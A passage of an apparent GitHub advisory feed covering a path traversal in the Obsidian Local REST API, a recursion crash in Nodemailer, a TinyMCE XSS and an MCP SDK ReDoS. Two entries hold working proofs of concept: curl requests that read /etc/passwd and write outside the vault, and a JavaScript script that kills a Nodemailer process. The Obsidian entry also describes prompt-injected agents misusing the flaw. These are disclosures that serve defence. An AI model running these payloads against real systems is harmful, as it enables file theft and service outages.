<p>GET/PUT/PATCH/POST/DELETE lack this guard. <strong>Apply the same <code>posix.resolve(syntheticRoot, …)</code> + <code>startsWith</code> check to the decoded path in every vault handler</strong>, and reject any segment that decodes to <code>..</code>.</p>
<h3 id="poc">PoC</h3>
<p>Prereq: a running Obsidian with the Local REST API plugin enabled and its configured API key (<code>$API_KEY</code>). Targets below are Unix; adjust per OS (e.g. <code>..%2F..%2FWindows%2Fwin.ini</code> on Windows).</p>
<pre><code class="language-bash"># READ outside the vault (returns 200 + the target file's real bytes):
curl --path-as-is -k -H "Authorization: Bearer $API_KEY" \
  "https://127.0.0.1:27124/vault/..%2F..%2F..%2F..%2Fetc%2Fpasswd"

# WRITE outside the vault (creates a file on disk outside the vault root):
curl --path-as-is -k -X PUT -H "Authorization: Bearer $API_KEY" --data "pwned" \
  "https://127.0.0.1:27124/vault/..%2F..%2F..%2Ftmp%2Fcanary.txt"
</code></pre>
<p><code>--path-as-is</code> stops curl from collapsing <code>..</code> client-side. A plain <code>../</code> (unencoded) request returns 404 — only the <code>%2F</code>/<code>%2e%2e</code> encoded form bypasses, confirming the decode-after-routing gap.</p>
<h3 id="impact">Impact</h3>
<p>Authenticated arbitrary file <strong>read / write / delete</strong> outside the Obsidian vault, with the OS privileges of the Obsidian process — typically the user's home directory (SSH keys, browser profiles, dotfiles, credentials). Amplified in MCP/LLM-agent deployments: this API is widely used as an MCP server, so a prompt-injection in vault content (or a malicious MCP client) can make an agent emit a <code>%2F</code> path — turning "the agent can edit my notes" into "the agent can read/write any file on the host," with no user intent to grant filesystem access beyond the vault.</p>
<p>This vulnerability was reported by Caleb Brisbin through responsible disclosure.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/coddingtonbear/obsidian-local-rest-api/security/advisories/GHSA-62gx-5q78-wrvx">https://github.com/coddingtonbear/obsidian-local-rest-api/security/advisories/GHSA-62gx-5q78-wrvx</a></li>
<li><a href="https://github.com/coddingtonbear/obsidian-local-rest-api/releases/tag/4.1.3">https://github.com/coddingtonbear/obsidian-local-rest-api/releases/tag/4.1.3</a></li>
<li><a href="https://github.com/advisories/GHSA-62gx-5q78-wrvx">https://github.com/advisories/GHSA-62gx-5q78-wrvx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-62gx-5q78-wrvx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-15T21:56:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nodemailer] Nodemailer’s addressparser is vulnerable to DoS caused by recursive calls]]></title>
        <id>https://github.com/advisories/GHSA-rcmh-qjqh-p98v</id>
        <link href="https://github.com/advisories/GHSA-rcmh-qjqh-p98v"/>
        <updated>2026-07-15T21:55:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A DoS can occur that immediately halts the system due to the use of an unsafe function.</p>
<h3 id="details">Details</h3>
<p>According to <strong>RFC 5322</strong>, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list.
However, the code implemented for this flattening process can be exploited by malicious input and triggers DoS</p>
<p>RFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group.
At the following location in lib/addressparser/index.js:</p>
<p><a href="https://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90">https://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90</a></p>
<p>there is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header:</p>
<p><code>g0: g1: g2: g3: ... gN: victim@example.com;</code></p>
<p>Because no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern
<code>addressparser → _handleAddress → addressparser → ...</code>
for each nested group. As a result, when an attacker sends a header containing many colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size exceeded and causing the process to terminate immediately. Due to the structure of this behavior, no authentication is required, and a single request is enough to shut down the service.</p>
<p>The problematic code section is as follows:</p>
<pre><code class="language-js">if (isGroup) {
    ...
    if (data.group.length) {
        let parsedGroup = addressparser(data.group.join(',')); // &lt;- boom!
        parsedGroup.forEach(member =&gt; {
            if (member.group) {
                groupMembers = groupMembers.concat(member.group);
            } else {
                groupMembers.push(member);
            }
        });
    }
}
</code></pre>
<p><code>data.group</code> is expected to contain members separated by commas, but in the attacker’s payload the group contains colon <code>(:)</code> tokens. Because of this, the parser repeatedly triggers recursive calls for each colon, proportional to their number.</p>
<h3 id="poc">PoC</h3>
<pre><code>const nodemailer = require('nodemailer');

function buildDeepGroup(depth) {
  let parts = [];
  for (let i = 0; i &lt; depth; i++) {
    parts.push(`g${i}:`);
  }
  return parts.join(' ') + ' user@example.com;';
}

const DEPTH = 3000; // &lt;- control depth 
const toHeader = buildDeepGroup(DEPTH);
console.log('to header length:', toHeader.length);

const transporter = nodemailer.createTransport({
  streamTransport: true,
  buffer: true,
  newline: 'unix'
});

console.log('parsing start');

transporter.sendMail(
  {
    from: 'test@example.com',
    to: toHeader,
    subject: 'test',
    text: 'test'
  },
  (err, info) =&gt; {
    if (err) {
      console.error('error:', err);
    } else {
      console.log('finished :', info &amp;&amp; info.envelope);
    }
  }
);
</code></pre>
<p>As a result, when the colon is repeated beyond a certain threshold, the Node.js process terminates immediately.</p>
<h3 id="impact">Impact</h3>
<p>The attacker can achieve the following:</p>
<ol>
<li>Force an immediate crash of any server/service that uses Nodemailer</li>
<li>Kill the backend process with a single web request</li>
<li>In environments using PM2/Forever, trigger a continuous restart loop, causing severe resource exhaustion”</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v">https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v</a></li>
<li><a href="https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150">https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-14874">https://nvd.nist.gov/vuln/detail/CVE-2025-14874</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2025-14874">https://access.redhat.com/security/cve/CVE-2025-14874</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2418133">https://bugzilla.redhat.com/show_bug.cgi?id=2418133</a></li>
<li><a href="https://github.com/nodemailer/nodemailer/commit/6218b8df">https://github.com/nodemailer/nodemailer/commit/6218b8df</a></li>
<li><a href="https://github.com/advisories/GHSA-rcmh-qjqh-p98v">https://github.com/advisories/GHSA-rcmh-qjqh-p98v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rcmh-qjqh-p98v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-12-01T20:44:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tinymce] TinyMCE Cross-Site Scripting (XSS) vulnerability through `mce:protected` comments]]></title>
        <id>https://github.com/advisories/GHSA-v98h-vmpc-fpqv</id>
        <link href="https://github.com/advisories/GHSA-v98h-vmpc-fpqv"/>
        <updated>2026-07-15T21:07:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Stored XSS vulnerability via forged mce:protected comments. Allows attackers to bypass sanitization and inject scripts that execute when content is restored. Impacts users who utilize the protect option.</p>
<h3 id="patches">Patches</h3>
<p>Patched by validating decoded mce:protected content against configured protect regex rules before restoring. Users should upgrade to the latest patched version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No official workaround available.</p>
<h3 id="fix">Fix</h3>
<p>To avoid this vulnerability:</p>
<p>Upgrade to TinyMCE 8.5.1 or higher.
Upgrade to TinyMCE 7.9.3 or higher.
Upgrade to TinyMCE 5.11.1 LTS or higher for TinyMCE 5.x (only available as part of commercial <a href="https://www.tiny.cloud/long-term-support/">long-term support</a> contract).</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>Tiny thanks <a href="https://github.com/he1d3n">Ivan Babenko</a> for their help identifying this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tinymce/tinymce/security/advisories/GHSA-v98h-vmpc-fpqv">https://github.com/tinymce/tinymce/security/advisories/GHSA-v98h-vmpc-fpqv</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-47762">https://nvd.nist.gov/vuln/detail/CVE-2026-47762</a></li>
<li><a href="https://www.tiny.cloud/docs/tinymce/7/7.9.3-release-notes/#overview">https://www.tiny.cloud/docs/tinymce/7/7.9.3-release-notes/#overview</a></li>
<li><a href="https://www.tiny.cloud/docs/tinymce/8/8.5.1-release-notes/#overview">https://www.tiny.cloud/docs/tinymce/8/8.5.1-release-notes/#overview</a></li>
<li><a href="https://github.com/advisories/GHSA-v98h-vmpc-fpqv">https://github.com/advisories/GHSA-v98h-vmpc-fpqv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v98h-vmpc-fpqv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-05T20:29:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@modelcontextprotocol/sdk] Anthropic's MCP TypeScript SDK has a ReDoS vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-8r9q-7v3j-jr4g</id>
        <link href="https://github.com/advisories/GHSA-8r9q-7v3j-jr4g"/>
        <updated>2026-07-15T18:32:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A ReDoS vulnerability in the <code>UriTemplate</code> class allows attackers to cause denial of service. The <code>partToRegExp()</code> function generates a regex pattern with nested quantifiers (<code>([^/]+(?:,[^/]+)*)</code>) for exploded template variables (e.g., <code>{/id*}</code>, <code>{?tags*}</code>), causing catastrophic backtracking on malicious input.</p>
<p><strong>Who is affected:</strong> MCP servers that register resource templates with exploded array patterns and accept requests from untrusted clients.</p>
<p><strong>Attack result:</strong> An attacker sends a crafted URI via <code>resources/read</code> request, causing 100% CPU utilization, server hang/crash, and denial of service for all clients.</p>
<h3 id="affected-versions">Affected Versions</h3>
<p>All versions of <code>@modelcontextprotocol/sdk</code> prior to the patched release.</p>
<h3 id="patches">Patches</h3>
<p>v1.25.2 contains b392f02ffcf37c088dbd114fedf25026ec3913d3 the fix modifies the regex pattern to prevent backtracking.</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Avoid using exploded patterns (<code>{/id*}</code>, <code>{?tags*}</code>) in resource templates</li>
<li>Implement request timeouts and rate limiting</li>
<li>Validate URIs before processing to reject suspicious patterns</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-0621">https://nvd.nist.gov/vuln/detail/CVE-2026-0621</a></li>
<li><a href="https://github.com/modelcontextprotocol/typescript-sdk/issues/965">https://github.com/modelcontextprotocol/typescript-sdk/issues/965</a></li>
<li><a href="https://www.vulncheck.com/advisories/mcp-typescript-sdk-uritemplate-exploded-array-pattern-redos">https://www.vulncheck.com/advisories/mcp-typescript-sdk-uritemplate-exploded-array-pattern-redos</a></li>
<li><a href="https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-cqwc-fm46-7fff">https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-cqwc-fm46-7fff</a></li>
<li><a href="https://github.com/modelcontextprotocol/typescript-sdk/commit/b392f02ffcf37c088dbd114fedf25026ec3913d3">https://github.com/modelcontextprotocol/typescript-sdk/commit/b392f02ffcf37c088dbd114fedf25026ec3913d3</a></li>
<li><a href="https://github.com/modelcontextprotocol/typescript-sdk/releases/tag/v1.25.2">https://github.com/modelcontextprotocol/typescript-sdk/releases/tag/v1.25.2</a></li>
<li><a href="https://github.com/modelcontextprotocol/typescript-sdk/commit/7f0cf730">https://github.com/modelcontextprotocol/typescript-sdk/commit/7f0cf730</a></li>
<li><a href="https://github.com/advisories/GHSA-8r9q-7v3j-jr4g">https://github.com/advisories/GHSA-8r9q-7v3j-jr4g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8r9q-7v3j-jr4g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-01-05T21:30:33.000Z</published>
    </entry>
</feed>